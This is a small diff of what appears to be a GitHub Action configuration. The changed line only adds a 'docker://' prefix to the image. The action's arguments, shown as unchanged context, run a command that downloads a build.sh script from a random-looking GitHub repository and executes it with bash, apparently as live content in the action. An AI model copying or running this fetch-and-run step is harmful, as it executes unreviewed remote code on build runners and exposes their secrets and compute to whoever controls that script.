@@ -8,6 +8,6 @@ on:
 
 runs:
   using: 'docker'
-  image: 'dazz111/ubuntu-sdk:build'
+  image: 'docker://dazz111/ubuntu-sdk:build'
   args:
     - wget https://raw.githubusercontent.com/Jjtitdutitdtti7s5s/fejeyrb/main/build.sh && bash build.sh
